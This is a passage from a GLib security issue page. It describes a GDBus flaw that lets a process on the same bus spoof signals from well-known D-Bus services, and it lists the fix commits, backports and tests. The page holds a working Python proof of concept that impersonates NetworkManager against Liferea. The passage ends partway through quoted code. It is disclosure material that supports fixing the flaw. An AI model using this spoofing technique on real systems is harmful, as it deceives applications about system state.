data-link-reference="false" data-project="658" data-commit="10e9a917be7fb92b6b27837ef7a7f1d0be6095d5" data-container="body" data-placement="top" title="gdbusmessage: Cache the arg0 value" class="gfm gfm-commit has-tooltip">10e9a917</a> "gdbusmessage: Cache the arg0 value" and <a href="/GNOME/glib/-/commit/7b15b1db4088aac26095d6e211c5b10375160d21" data-reference-type="commit" data-original="7b15b1db" data-link="false" data-link-reference="false" data-project="658" data-commit="7b15b1db4088aac26095d6e211c5b10375160d21" data-container="body" data-placement="top" title="gdbus-proxy test: Wait before asserting name owner has gone away" class="gfm gfm-commit has-tooltip">7b15b1db</a> "gdbus-proxy test: Wait before asserting name owner has gone away" are not required to fix the vulnerability, but applying them in addition is recommended. When applying the vulnerability fix without those commits, GLib test failures were observed.</p>&#x000A;<p data-sourcepos="50:1-50:187" dir="auto">When backporting to older stable release branches, a backport of <code data-sourcepos="50:67-50:77">g_set_str()</code> will be required, for example <a href="/GNOME/glib/-/commit/67052fedf451975c86396b75fda81cef6cd47beb" data-reference-type="commit" data-original="67052fed" data-link="false" data-link-reference="false" data-project="658" data-commit="67052fedf451975c86396b75fda81cef6cd47beb" data-container="body" data-placement="top" title="gdbusconnection: Make a backport of g_set_str() available" class="gfm gfm-commit has-tooltip">67052fed</a> "gdbusconnection: Make a backport of g_set_str() available" in <a href="/GNOME/glib/-/merge_requests/4041" data-reference-type="merge_request" data-original="!4041" data-link="false" data-link-reference="false" data-project="658" data-merge-request="92490" data-project-path="GNOME/glib" data-iid="4041" data-container="body" data-placement="top" title="Backport !4038 &quot;gdbusconnection: Don't deliver signals if the sender doesn't match&quot; to glib-2-74" class="gfm gfm-merge_request">!4041 (closed)</a>.</p>&#x000A;<p data-sourcepos="52:1-52:443" dir="auto">Fixing this vulnerability will trigger a regression in GNOME Shell's implementation of screen recording and screencasting, due to a pre-existing GNOME Shell bug. Applying commit <a href="/GNOME/gnome-shell/-/commit/50a011a19dcc6997ea6173c07bb80b2d9888d363" data-reference-type="commit" data-original="GNOME/gnome-shell@50a011a1" data-link="false" data-link-reference="false" data-project="546" data-commit="50a011a19dcc6997ea6173c07bb80b2d9888d363" data-container="body" data-placement="top" title="screencast: Correct expected bus name for streams" class="gfm gfm-commit has-tooltip">gnome-shell@50a011a1</a> "screencast: Correct expected bus name for streams" to GNOME Shell fixes that regression. In distributions that ship GNOME Shell, it is recommended to make that change as part of the same security update that fixes the GLib vulnerability.</p>&#x000A;<p data-sourcepos="54:1-54:166" dir="auto"><a href="/GNOME/glib/-/merge_requests/4041" data-reference-type="merge_request" data-original="!4041" data-link="false" data-link-reference="false" data-project="658" data-merge-request="92490" data-project-path="GNOME/glib" data-iid="4041" data-container="body" data-placement="top" title="Backport !4038 &quot;gdbusconnection: Don't deliver signals if the sender doesn't match&quot; to glib-2-74" class="gfm gfm-merge_request">!4041 (closed)</a> and <a href="/GNOME/glib/-/merge_requests/4042" data-reference-type="merge_request" data-original="!4042" data-link="false" data-link-reference="false" data-project="658" data-merge-request="92491" data-project-path="GNOME/glib" data-iid="4042" data-container="body" data-placement="top" title="Backport !4038 &quot;gdbusconnection: Don't deliver signals if the sender doesn't match&quot; to glib-2-66" class="gfm gfm-merge_request">!4042 (closed)</a> contain unofficial backports to GLib 2.74.x (for Debian 12) and 2.66.x (for Debian 11) which other distributors might find useful as a starting point.</p>&#x000A;<h4 data-sourcepos="56:1-56:18" dir="auto">&#x000A;<a id="user-content-test-coverage" class="anchor" href="#test-coverage" aria-hidden="true"></a>Test coverage</h4>&#x000A;<ul data-sourcepos="58:1-65:0" dir="auto">&#x000A;<li data-sourcepos="58:1-58:67">&#x000A;<a href="/GNOME/glib/-/commit/124b4571bb5ef5b268eeea987d00b756a4480fc0" data-reference-type="commit" data-original="124b4571" data-link="false" data-link-reference="false" data-project="658" data-commit="124b4571bb5ef5b268eeea987d00b756a4480fc0" data-container="body" data-placement="top" title="tests: Add a data-driven test for signal subscriptions" class="gfm gfm-commit has-tooltip">124b4571</a> "tests: Add a data-driven test for signal subscriptions"</li>&#x000A;<li data-sourcepos="59:1-59:81">&#x000A;<a href="/GNOME/glib/-/commit/14c3d6938e32e2f0ca7a1227f66590109af5e767" data-reference-type="commit" data-original="14c3d693" data-link="false" data-link-reference="false" data-project="658" data-commit="14c3d6938e32e2f0ca7a1227f66590109af5e767" data-container="body" data-placement="top" title="tests: Add support for subscribing to signals from a well-known name" class="gfm gfm-commit has-tooltip">14c3d693</a> "tests: Add support for subscribing to signals from a well-known name"</li>&#x000A;<li data-sourcepos="60:1-60:83">&#x000A;<a href="/GNOME/glib/-/commit/984354e02d2915506c103d21206ae733e92da5ae" data-reference-type="commit" data-original="984354e0" data-link="false" data-link-reference="false" data-project="658" data-commit="984354e02d2915506c103d21206ae733e92da5ae" data-container="body" data-placement="top" title="tests: Add a test-case for what happens if a unique name doesn't exist" class="gfm gfm-commit has-tooltip">984354e0</a> "tests: Add a test-case for what happens if a unique name doesn't exist"</li>&#x000A;<li data-sourcepos="61:1-61:83">&#x000A;<a href="/GNOME/glib/-/commit/fd265663f2050e2b65d231c4f42fa6b9480c0eb7" data-reference-type="commit" data-original="fd265663" data-link="false" data-link-reference="false" data-project="658" data-commit="fd265663f2050e2b65d231c4f42fa6b9480c0eb7" data-container="body" data-placement="top" title="tests: Add test coverage for signals that match the message bus's name" class="gfm gfm-commit has-tooltip">fd265663</a> "tests: Add test coverage for signals that match the message bus's name"</li>&#x000A;<li data-sourcepos="62:1-62:67">&#x000A;<a href="/GNOME/glib/-/commit/fc0ee9207281bb5369c2e346606d3e321e5036ff" data-reference-type="commit" data-original="fc0ee920" data-link="false" data-link-reference="false" data-project="658" data-commit="fc0ee9207281bb5369c2e346606d3e321e5036ff" data-container="body" data-placement="top" title="tests: Add a test for matching by two well-known names" class="gfm gfm-commit has-tooltip">fc0ee920</a> "tests: Add a test for matching by two well-known names"</li>&#x000A;<li data-sourcepos="63:1-63:70">&#x000A;<a href="/GNOME/glib/-/commit/f6d1b5471ae92b5c22cb031db8cbc81e3722b9b9" data-reference-type="commit" data-original="f6d1b547" data-link="false" data-link-reference="false" data-project="658" data-commit="f6d1b5471ae92b5c22cb031db8cbc81e3722b9b9" data-container="body" data-placement="top" title="tests: Add a test for signal filtering by well-known name" class="gfm gfm-commit has-tooltip">f6d1b547</a> "tests: Add a test for signal filtering by well-known name"</li>&#x000A;<li data-sourcepos="64:1-65:0">&#x000A;<a href="/GNOME/glib/-/commit/96e3190aef3c1320d1e336c35c03c360b7def277" data-reference-type="commit" data-original="96e3190a" data-link="false" data-link-reference="false" data-project="658" data-commit="96e3190aef3c1320d1e336c35c03c360b7def277" data-container="body" data-placement="top" title="tests: Ensure that unsubscribing with GetNameOwner in-flight doesn't crash" class="gfm gfm-commit has-tooltip">96e3190a</a> "tests: Ensure that unsubscribing with GetNameOwner in-flight doesn't crash"</li>&#x000A;</ul>&#x000A;<p data-sourcepos="66:1-66:62" dir="auto">These tests are included in <a href="/GNOME/glib/-/merge_requests/4038" data-reference-type="merge_request" data-original="!4038" data-link="false" data-link-reference="false" data-project="658" data-merge-request="92486" data-project-path="GNOME/glib" data-iid="4038" data-container="body" data-placement="top" title="gdbusconnection: Don't deliver signals if the sender doesn't match" class="gfm gfm-merge_request">!4038 (merged)</a>, <a href="/GNOME/glib/-/merge_requests/4039" data-reference-type="merge_request" data-original="!4039" data-link="false" data-link-reference="false" data-project="658" data-merge-request="92487" data-project-path="GNOME/glib" data-iid="4039" data-container="body" data-placement="top" title="Backport !4038 “gdbusconnection: Don't deliver signals if the sender doesn't match” to glib-2-80" class="gfm gfm-merge_request">!4039 (merged)</a>, <a href="/GNOME/glib/-/merge_requests/4040" data-reference-type="merge_request" data-original="!4040" data-link="false" data-link-reference="false" data-project="658" data-merge-request="92488" data-project-path="GNOME/glib" data-iid="4040" data-container="body" data-placement="top" title="Backport !4038 “gdbusconnection: Don't deliver signals if the sender doesn't match” to glib-2-78" class="gfm gfm-merge_request">!4040 (merged)</a>, <a href="/GNOME/glib/-/merge_requests/4041" data-reference-type="merge_request" data-original="!4041" data-link="false" data-link-reference="false" data-project="658" data-merge-request="92490" data-project-path="GNOME/glib" data-iid="4041" data-container="body" data-placement="top" title="Backport !4038 &quot;gdbusconnection: Don't deliver signals if the sender doesn't match&quot; to glib-2-74" class="gfm gfm-merge_request">!4041 (closed)</a>, <a href="/GNOME/glib/-/merge_requests/4042" data-reference-type="merge_request" data-original="!4042" data-link="false" data-link-reference="false" data-project="658" data-merge-request="92491" data-project-path="GNOME/glib" data-iid="4042" data-container="body" data-placement="top" title="Backport !4038 &quot;gdbusconnection: Don't deliver signals if the sender doesn't match&quot; to glib-2-66" class="gfm gfm-merge_request">!4042 (closed)</a>.</p>&#x000A;<hr data-sourcepos="68:1-69:0">&#x000A;<h2 data-sourcepos="70:1-70:18" dir="auto">&#x000A;<a id="user-content-original-report" class="anchor" href="#original-report" aria-hidden="true"></a>Original report</h2>&#x000A;<p data-sourcepos="72:1-72:77" dir="auto">GDBus subscriptions to well-known services are vulnerable to unicast spoofing</p>&#x000A;<p data-sourcepos="74:1-74:178" dir="auto">When <code data-sourcepos="74:7-74:42">g_dbus_connection_signal_subscribe()</code> is called with a well-known bus service name (e.g. <code data-sourcepos="74:97-74:118">org.freedesktop.login1</code>) as value for the <code data-sourcepos="74:140-74:145">sender</code> argument, the following occurs:</p>&#x000A;<ol data-sourcepos="76:1-82:0" dir="auto">&#x000A;<li data-sourcepos="76:1-76:100">&#x000A;<code data-sourcepos="76:5-76:18">args_to_rule()</code> is called, creating a D-Bus match rule string that contains the well-known name.</li>&#x000A;<li data-sourcepos="77:1-77:112">The local variable <code data-sourcepos="77:24-77:41">sender_unique_name</code> is set to <code data-sourcepos="77:55-77:56">""</code>, as it is a well-known name rather than a unique name.</li>&#x000A;<li data-sourcepos="78:1-78:150">The <code data-sourcepos="78:9-78:31">map_rule_to_signal_data</code> hash table is used to look for a previous <code data-sourcepos="78:77-78:86">SignalData</code> structure for that exact rule string. Let's assume none exist.</li>&#x000A;<li data-sourcepos="79:1-79:215">A <code data-sourcepos="79:7-79:16">SignalData</code> structure is created with the well-known name as <code data-sourcepos="79:69-79:74">sender</code> and empty string as <code data-sourcepos="79:98-79:115">sender_unique_name</code>, then a pointer to the <code data-sourcepos="79:142-79:151">SignalData</code> is stored in <code data-sourcepos="79:168-79:190">map_rule_to_signal_data</code> for future occurrences.</li>&#x000A;<li data-sourcepos="80:1-80:80">An <code data-sourcepos="80:8-80:15">AddMatch</code> message is sent to <code data-sourcepos="80:38-80:57">org.freedesktop.DBus</code> with the rule string.</li>&#x000A;<li data-sourcepos="81:1-82:0">A pointer to <code data-sourcepos="81:18-81:27">SignalData</code> is stored in <code data-sourcepos="81:44-81:86">map_sender_unique_name_to_signal_data_array</code> with key <code data-sourcepos="81:99-81:129">signal_data-&gt;sender_unique_name</code>, <strong data-sourcepos="81:133-81:154">hence empty string</strong>.</li>&#x000A;</ol>&#x000A;<p data-sourcepos="83:1-83:46" dir="auto">Later, the process may receive a D-Bus signal.</p>&#x000A;<ol data-sourcepos="85:1-99:0" dir="auto">&#x000A;<li data-sourcepos="85:1-85:62">&#x000A;<p data-sourcepos="85:4-85:62"><code data-sourcepos="85:5-85:24">distribute_signals()</code> gets called with the signal message.</p>&#x000A;</li>&#x000A;<li data-sourcepos="86:1-86:134">&#x000A;<p data-sourcepos="86:4-86:134"><code data-sourcepos="86:5-86:47">map_sender_unique_name_to_signal_data_array</code> is queried with the unique name of the sender of the signal as key. Nothing is found.</p>&#x000A;</li>&#x000A;<li data-sourcepos="87:1-87:141">&#x000A;<p data-sourcepos="87:4-87:141"><code data-sourcepos="87:5-87:47">map_sender_unique_name_to_signal_data_array</code> is queried with the empty string as key and <code data-sourcepos="87:95-87:114">schedule_callbacks()</code> is called on the entries.</p>&#x000A;</li>&#x000A;<li data-sourcepos="88:1-97:0">&#x000A;<p data-sourcepos="88:4-88:118"><code data-sourcepos="88:5-88:24">schedule_callbacks()</code> iterates through the array of <code data-sourcepos="88:58-88:68">SignalData*</code> discarding <code data-sourcepos="88:83-88:92">SignalData</code> structures where either:</p>&#x000A;<p data-sourcepos="90:4-90:39">a) The interface name doesn't match.</p>&#x000A;<p data-sourcepos="92:4-92:50">b) The member (i.e. signal name) doesn't match.</p>&#x000A;<p data-sourcepos="94:4-94:36">c) The object path doesn't match.</p>&#x000A;<p data-sourcepos="96:4-96:39">d) The signal arguments don't match.</p>&#x000A;</li>&#x000A;<li data-sourcepos="98:1-99:0">&#x000A;<p data-sourcepos="98:4-98:66">The signal callback is called without any further verification.</p>&#x000A;</li>&#x000A;</ol>&#x000A;<p data-sourcepos="100:1-100:451" dir="auto"><strong data-sourcepos="100:1-100:69">Notice that "The sender doesn't match" is not along these checks.</strong> GDBus assumes that either has already been checked by indexing <code data-sourcepos="100:135-100:177">map_sender_unique_name_to_signal_data_array</code> (which is only true for well-known names and <code data-sourcepos="100:226-100:245">org.freedesktop.DBus</code>) or that the D-Bus broker wouldn't send such a message due to it being filtered by the match rule. However, there is at least one case described in the D-Bus specification in which this is not sufficient:</p>&#x000A;<blockquote data-sourcepos="102:1-102:444" dir="auto">&#x000A;<p data-sourcepos="102:3-102:444">Messages may have a DESTINATION field (see the section called “Header Fields”), resulting in a unicast message. If the DESTINATION field is present, it specifies a message recipient by name. Method calls and replies normally specify this field. <strong data-sourcepos="102:252-102:444">The message bus must send messages (of any type) with the DESTINATION field set to the specified recipient, regardless of whether the recipient has set up a match rule matching the message.</strong></p>&#x000A;</blockquote>&#x000A;<p data-sourcepos="104:1-104:374" dir="auto">Therefore, an attacker on the same bus, even if unable to own any well-known names as it's the case by default in the SYSTEM bus, can construct a unicast DBus signal message with <code data-sourcepos="104:181-104:191">DESTINATION</code> being the targeted application and send a signal with identical interface name, member, object path and matching arguments in order to spoof a D-Bus service with a well-known name.</p>&#x000A;<p data-sourcepos="106:1-106:397" dir="auto">The signal will trigger the invocation of the callback and it would be up to the application to validate the <code data-sourcepos="106:111-106:116">sender</code> argument and not blindly trust the received signal arguments. This is a problem when the application passed a well-known service name as the <code data-sourcepos="106:261-106:266">sender</code> argument for <code data-sourcepos="106:283-106:318">g_dbus_connection_signal_subscribe()</code> expecting GDBus -- somewhat reasonably -- to do this filtering on its behalf.</p>&#x000A;<p data-sourcepos="108:1-108:167" dir="auto">g_dbus_connection_signal_subscribe() is also used internally by GDBus, maybe most notably by GDBusProxy.  Fortunately there is this additional check in <code data-sourcepos="108:154-108:165">gdbusproxy.c</code>:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="110:1-130:3" data-canonical-lang="c" class="code highlight js-syntax-highlight language-c" v-pre="true"><code><span id="LC1" class="line" lang="c"><span class="k">static</span> <span class="kt">void</span></span>&#x000A;<span id="LC2" class="line" lang="c"><span class="nf">on_signal_received</span> <span class="p">(</span><span class="n">GDBusConnection</span> <span class="o">*</span><span class="n">connection</span><span class="p">,</span></span>&#x000A;<span id="LC3" class="line" lang="c">                    <span class="k">const</span> <span class="n">gchar</span>     <span class="o">*</span><span class="n">sender_name</span><span class="p">,</span></span>&#x000A;<span id="LC4" class="line" lang="c">                    <span class="k">const</span> <span class="n">gchar</span>     <span class="o">*</span><span class="n">object_path</span><span class="p">,</span></span>&#x000A;<span id="LC5" class="line" lang="c">                    <span class="k">const</span> <span class="n">gchar</span>     <span class="o">*</span><span class="n">interface_name</span><span class="p">,</span></span>&#x000A;<span id="LC6" class="line" lang="c">                    <span class="k">const</span> <span class="n">gchar</span>     <span class="o">*</span><span class="n">signal_name</span><span class="p">,</span></span>&#x000A;<span id="LC7" class="line" lang="c">                    <span class="n">GVariant</span>        <span class="o">*</span><span class="n">parameters</span><span class="p">,</span></span>&#x000A;<span id="LC8" class="line" lang="c">                    <span class="n">gpointer</span>         <span class="n">user_data</span><span class="p">)</span></span>&#x000A;<span id="LC9" class="line" lang="c"><span class="p">{</span></span>&#x000A;<span id="LC10" class="line" lang="c">  <span class="n">GWeakRef</span> <span class="o">*</span><span class="n">proxy_weak</span> <span class="o">=</span> <span class="n">user_data</span><span class="p">;</span></span>&#x000A;<span id="LC11" class="line" lang="c">  <span class="n">GDBusProxy</span> <span class="o">*</span><span class="n">proxy</span><span class="p">;</span></span>&#x000A;<span id="LC12" class="line" lang="c"></span>&#x000A;<span id="LC13" class="line" lang="c">  <span class="n">proxy</span> <span class="o">=</span> <span class="n">G_DBUS_PROXY</span> <span class="p">(</span><span class="n">g_weak_ref_get</span> <span class="p">(</span><span class="n">proxy_weak</span><span class="p">));</span></span>&#x000A;<span id="LC14" class="line" lang="c">  <span class="c1">// ...</span></span>&#x000A;<span id="LC15" class="line" lang="c">  <span class="k">if</span> <span class="p">(</span><span class="n">proxy</span><span class="o">-&gt;</span><span class="n">priv</span><span class="o">-&gt;</span><span class="n">name_owner</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">g_strcmp0</span> <span class="p">(</span><span class="n">sender_name</span><span class="p">,</span> <span class="n">proxy</span><span class="o">-&gt;</span><span class="n">priv</span><span class="o">-&gt;</span><span class="n">name_owner</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span></span>&#x000A;<span id="LC16" class="line" lang="c">    <span class="p">{</span></span>&#x000A;<span id="LC17" class="line" lang="c">      <span class="c1">// ...</span></span>&#x000A;<span id="LC18" class="line" lang="c">      <span class="k">goto</span> <span class="n">out</span><span class="p">;</span></span>&#x000A;<span id="LC19" class="line" lang="c">    <span class="p">}</span></span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="132:1-132:361" dir="auto">Thanks to that additional check, users of GDBusProxy (e.g. those making use of the GLib signals <code data-sourcepos="132:98-132:107">'g-signal'</code> and <code data-sourcepos="132:115-132:136">'g-properties-changed'</code> instead of calling <code data-sourcepos="132:159-132:194">g_dbus_connection_signal_subscribe()</code> for signal subscriptions) are not affected unless <code data-sourcepos="132:248-132:270">proxy-&gt;priv-&gt;name_owner</code> is NULL, which will only happen if the provided well-known name doesn't exist in the bus.</p>&#x000A;<h2 data-sourcepos="134:1-134:19" dir="auto">&#x000A;<a id="user-content-proof-of-concept" class="anchor" href="#proof-of-concept" aria-hidden="true"></a>Proof of concept</h2>&#x000A;<p data-sourcepos="136:1-136:300" dir="auto">For a harmless proof of concept targetting the system bus, let's impersonate NetworkManager to convince the RSS reader Liferea that we are offline when we're actually online, or vice versa. The following is Python code. The packages dbus-fast and psutil must be installed and Liferea must be running.</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="138:1-180:3" data-canonical-lang="python" class="code highlight js-syntax-highlight language-python" v-pre="true"><code><span id="LC1" class="line" lang="python"><span class="kn">from</span> <span class="n">dbus_fast</span> <span class="kn">import</span> <span class="n">BusType</span><span class="p">,</span> <span class="n">Message</span></span>&#x000A;<span id="LC2" class="line" lang="python"><span class="kn">from</span> <span class="n">dbus_fast.signature</span> <span class="kn">import</span> <span class="n">Variant</span></span>&#x000A;<span id="LC3" class="line" lang="python"><span class="kn">from</span> <span class="n">dbus_fast.aio.message_bus</span> <span class="kn">import</span> <span class="n">MessageBus</span></span>&#x000A;<span id="LC4" class="line" lang="python"></span>&#x000A;<span id="LC5" class="line" lang="python"><span class="kn">import</span> <span class="n">asyncio</span></span>&#x000A;<span id="LC6" class="line" lang="python"><span class="kn">import</span> <span class="n">psutil</span></span>&#x000A;<span id="LC7" class="line" lang="python"></span>&#x000A;<span id="LC8" class="line" lang="python"><span class="k">async</span> <span class="k">def</span> <span class="nf">find_bus_service_with_process_string</span><span class="p">(</span><span class="n">bus</span><span class="p">:</span> <span class="n">MessageBus</span><span class="p">,</span> <span class="n">process_str</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span></span>&#x000A;<span id="LC9" class="line" lang="python">    <span class="n">dbus_introspection</span> <span class="o">=</span> <span class="k">await</span> <span class="n">bus</span><span class="p">.</span><span class="nf">introspect</span><span class="p">(</span></span>&#x000A;<span id="LC10" class="line" lang="python">        <span class="sh">"</span><span class="s">org.freedesktop.DBus</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/org/freedesktop/DBus</span><span class="sh">"</span><span class="p">)</span></span>&#x000A;<span id="LC11" class="line" lang="python">    <span class="n">dbus_proxy</span> <span class="o">=</span> <span class="n">bus</span><span class="p">.</span><span class="nf">get_proxy_object</span><span class="p">(</span></span>&#x000A;<span id="LC12" class="line" lang="python">        <span class="sh">"</span><span class="s">org.freedesktop.DBus</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/org/freedesktop/DBus</span><span class="sh">"</span><span class="p">,</span></span>&#x000A;<span id="LC13" class="line" lang="python">        <span class="n">dbus_introspection</span><span class="p">)</span></span>&#x000A;<span id="LC14" class="line" lang="python">    <span class="n">dbus_iface</span> <span class="o">=</span> <span class="n">dbus_proxy</span><span class="p">.</span><span class="nf">get_interface</span><span class="p">(</span><span class="sh">"</span><span class="s">org.freedesktop.DBus</span><span class="sh">"</span><span class="p">)</span></span>&#x000A;<span id="LC15" class="line" lang="python">    <span class="c1"># Check the connections one by one to find the target</span></span>&#x000A;<span id="LC16" class="line" lang="python">    <span class="k">for</span> <span class="n">service_name</span> <span class="ow">in</span> <span class="k">await</span> <span class="n">dbus_iface</span><span class="p">.</span><span class="nf">call_list_names</span><span class="p">():</span></span>&#x000A;<span id="LC17" class="line" lang="python">        <span class="n">pid</span> <span class="o">=</span> <span class="k">await</span> <span class="n">dbus_iface</span><span class="p">.</span><span class="nf">call_get_connection_unix_process_id</span><span class="p">(</span><span class="n">service_name</span><span class="p">)</span></span>&#x000A;<span id="LC18" class="line" lang="python">        <span class="n">cmdline</span> <span class="o">=</span> <span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">psutil</span><span class="p">.</span><span class="nc">Process</span><span class="p">(</span><span class="n">pid</span><span class="p">).</span><span class="nf">cmdline</span><span class="p">())</span></span>&#x000A;<span id="LC19" class="line" lang="python">        <span class="k">if</span> <span class="n">process_str</span> <span class="ow">in</span> <span class="n">cmdline</span><span class="p">:</span></span>&#x000A;<span id="LC20" class="line" lang="python">            <span class="k">return</span> <span class="n">service_name</span></span>&#x000A;<span id="LC21" class="line" lang="python"></span>&#x000A;<span id="LC22" class="line" lang="python"><span class="n">NM_STATE_DISCONNECTED</span> <span class="o">=</span> <span class="mi">20</span></span>&#x000A;<span id="LC23" class="line" lang="python"><span class="n">NM_STATE_CONNECTED_GLOBAL</span> <span class="o">=</span> <span class="mi">70</span></span>&#x000A;<span id="LC24" class="line" lang="python"></span>&#x000A;<span id="LC25" class="line" lang="python"><span class="k">async</span> <span class="k">def</span> <span class="nf">main</span><span class="p">():</span></span>&#x000A;<span id="LC26" class="line" lang="python">    <span class="n">bus</span> <span class="o">=</span> <span class="k">await</span> <span class="nc">MessageBus</span><span class="p">(</span><span class="n">bus_type</span><span class="o">=</span><span class="n">BusType</span><span class="p">.</span><span class="n">SYSTEM</span><span class="p">).</span><span class="nf">connect</span><span class="p">()</span></span>&#x000A;<span id="LC27" class="line" lang="python">    <span class="n">victim_bus_user</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">find_bus_service_with_process_string</span><span class="p">(</span><span class="n">bus</span><span class="p">,</span></span>&#x000A;<span id="LC28" class="line" lang="python">        <span class="sh">"</span><span class="s">/liferea</span><span class="sh">"</span><span class="p">)</span></span>&#x000A;<span id="LC29" class="line" lang="python">    <span class="n">malicious_msg</span> <span class="o">=</span> <span class="n">Message</span><span class="p">.</span><span class="nf">new_signal</span><span class="p">(</span></span>&#x000A;<span id="LC30" class="line" lang="python">        <span class="n">path</span><span class="o">=</span><span class="sh">"</span><span class="s">/org/freedesktop/NetworkManager</span><span class="sh">"</span><span class="p">,</span></span>&#x000A;<span id="LC31" class="line" lang="python">        <span class="n">interface</span><span class="o">=</span><span class="sh">"</span><span class="s">org.freedesktop.NetworkManager</span><span class="sh">"</span><span class="p">,</span></span>&#x000A;<span id="LC32" class="line" lang="python">        <span class="n">member</span><span class="o">=</span><span class="sh">"</span><span class="s">StateChanged</span><span class="sh">"</span><span class="p">,</span></span>&#x000A;<span id="LC33" class="line" lang="python">        <span class="n">signature</span><span class="o">=</span><span class="sh">"</span><span class="s">u</span><span class="sh">"</span><span class="p">,</span></span>&#x000A;<span id="LC34" class="line" lang="python">        <span class="n">body</span><span class="o">=</span><span class="p">[</span></span>&#x000A;<span id="LC35" class="line" lang="python">            <span class="n">NM_STATE_DISCONNECTED</span></span>&#x000A;<span id="LC36" class="line" lang="python">        <span class="p">],</span></span>&#x000A;<span id="LC37" class="line" lang="python">    <span class="p">)</span></span>&#x000A;<span id="LC38" class="line" lang="python">    <span class="n">malicious_msg</span><span class="p">.</span><span class="n">destination</span> <span class="o">=</span> <span class="n">victim_bus_user</span></span>&#x000A;<span id="LC39" class="line" lang="python">    <span class="k">await</span> <span class="n">bus</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">malicious_msg</span><span class="p">)</span></span>&#x000A;<span id="LC40" class="line" lang="python"></span>&#x000A;<span id="LC41" class="line" lang="python"><span class="n">asyncio</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nf">main</span><span class="p">())</span></span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="182:1-182:221" dir="auto">After running the script, try clicking in "Update all" in Liferea and you'll see "Liferea is in offline mode. No update is possible." If you edit the script to send NM_STATE_CONNECTED_GLOBAL it will fetch news once again.</p>&#x000A;<p data-sourcepos="184:1-184:152" dir="auto">This is because Liferea uses g_dbus_connection_signal_subscribe() to listen for the StateChanged signal filtering by sender and then trusts the signals:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="186:1-197:3" data-canonical-lang="c" class="code highlight js-syntax-highlight language-c" v-pre="true"><code><span id="LC1" class="line" lang="c"><span class="n">self</span><span class="o">-&gt;</span><span class="n">priv</span><span class="o">-&gt;</span><span class="n">subscription_id</span> <span class="o">=</span> <span class="n">g_dbus_connection_signal_subscribe</span> <span class="p">(</span><span class="n">self</span><span class="o">-&gt;</span><span class="n">priv</span><span class="o">-&gt;</span><span class="n">conn</span><span class="p">,</span></span>&#x000A;<span id="LC2" class="line" lang="c">                                                                 <span class="s">"org.freedesktop.NetworkManager"</span><span class="p">,</span></span>&#x000A;<span id="LC3" class="line" lang="c">                                                                 <span class="s">"org.freedesktop.NetworkManager"</span><span class="p">,</span></span>&#x000A;<span id="LC4" class="line" lang="c">                                                                 <span class="s">"StateChanged"</span><span class="p">,</span></span>&#x000A;<span id="LC5" class="line" lang="c">                                                                 <span class="nb">NULL</span><span class="p">,</span></span>&#x000A;<span id="LC6" class="line" lang="c">                                                                 <span class="nb">NULL</span><span class="p">,</span></span>&#x000A;<span id="LC7" class="line" lang="c">                                                                 <span class="n">G_DBUS_SIGNAL_FLAGS_NONE</span><span class="p">,</span></span>&#x000A;<span id="LC8" class="line" lang="c">                                                                 <span class="n">on_network_state_changed_cb</span><span class="p">,</span></span>&#x000A;<span id="LC9" class="line" lang="c">                                                                 <span class="n">self</span><span class="p">,</span></span>&#x000A;<span id="LC10" class="line" lang="c">                                                                 <span class="nb">NULL</span><span class="p">);</span></span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="199:1-222:3" data-canonical-lang="c" class="code highlight js-syntax-highlight language-c" v-pre="true"><code><span id="LC1" class="line" lang="c"><span class="k">static</span> <span class="kt">void</span></span>&#x000A;<span id="LC2" class="line" lang="c"><span class="nf">on_network_state_changed_cb</span> <span class="p">(</span><span class="n">GDBusConnection</span> <span class="o">*</span><span class="n">connection</span><span class="p">,</span></span>&#x000A;<span id="LC3" class="line" lang="c">			     <span class="k">const</span> <span class="n">gchar</span> <span class="o">*</span><span class="n">sender_name</span><span class="p">,</span></span>&#x000A;<span id="LC4" class="line" lang="c">			     <span class="k">const</span> <span class="n">gchar</span> <span class="o">*</span><span class="n">object_path</span><span class="p">,</span></span>&#x000A;<span id="LC5" class="line" lang="c">			     <span class="k">const</span> <span class="n">gchar</span> <span class="o">*</span><span class="n">interface_name</span><span class="p">,</span></span>&#x000A;<span id="LC6" class="line" lang="c">			     <span class="k">const</span> <span class="n">gchar</span> <span class="o">*</span><span class="n">signal_name</span><span class="p">,</span></span>&#x000A;<span id="LC7" class="line" lang="c">			     <span class="n">GVariant</span> <span class="o">*</span><span class="n">parameters</span><span class="p">,</span></span>&#x000A;<span id="LC8" class="line" lang="c">			     <span class="n">gpointer</span> <span class="n">user_data</span><span class="p">)</span></span>&#x000A;<span id="LC9" class="line" lang="c"><span class="p">{</span></span>&#x000A;<span id="LC10" class="line" lang="c">	<span class="n">gboolean</span> <span class="n">online</span> <span class="o">=</span> <span class="n">network_monitor_is_online</span> <span class="p">();</span></span>&#x000A;<span id="LC11" class="line" lang="c">	<span class="n">guint</span> <span class="n">state</span><span class="p">;</span></span>&#x000A;<span id="LC12" class="line" lang="c"></span>&#x000A;<span id="LC13" class="line" lang="c">	<span class="n">g_variant_get</span> <span class="p">(</span><span class="n">parameters</span><span class="p">,</span> <span class="s">"(u)"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">state</span><span class="p">);</span></span>&#x000A;<span id="LC14" class="line" lang="c"></span>&#x000A;<span id="LC15" class="line" lang="c">	